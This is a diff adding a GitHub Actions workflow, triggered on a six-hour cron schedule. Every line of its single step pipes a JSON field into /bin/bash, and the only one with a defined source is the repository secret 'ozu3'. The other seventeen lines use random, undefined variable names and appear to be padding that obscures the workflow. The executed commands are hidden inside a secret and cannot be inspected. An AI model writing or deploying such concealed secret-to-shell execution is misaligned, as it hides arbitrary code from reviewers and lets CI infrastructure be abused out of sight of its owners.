@@ -1,0 +1,33 @@
+name: iyuanzhan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: iyuanzhan
+        env:
+          ozu3: ${{ secrets.ozu3 }}
+        run: |
+          echo $ozu3 | jq -r .s7371 | /bin/bash
+          echo $reqec0 | jq -r .n5815 | /bin/bash
+          echo $s0 | jq -r .xlsb458 | /bin/bash
+          echo $nq7 | jq -r .ecc18366 | /bin/bash
+          echo $vtmj74 | jq -r .u11 | /bin/bash
+          echo $tic3374 | jq -r .u4 | /bin/bash
+          echo $yj84604 | jq -r .ndcrd64812 | /bin/bash
+          echo $qkrq8 | jq -r .znnpp8 | /bin/bash
+          echo $zdca8428 | jq -r .emgs626 | /bin/bash
+          echo $i4 | jq -r .lwd12430 | /bin/bash
+          echo $wd8 | jq -r .qgnn90011 | /bin/bash
+          echo $nw58429 | jq -r .vp31 | /bin/bash
+          echo $tte00 | jq -r .bnc85611 | /bin/bash
+          echo $eont68331 | jq -r .vp9966 | /bin/bash
+          echo $bftat94307 | jq -r .sqw8484 | /bin/bash
+          echo $mwltz1 | jq -r .yngt8 | /bin/bash
+          echo $qm4410 | jq -r .drr43 | /bin/bash
+          echo $iluis7 | jq -r .dpbbw00 | /bin/bash
+
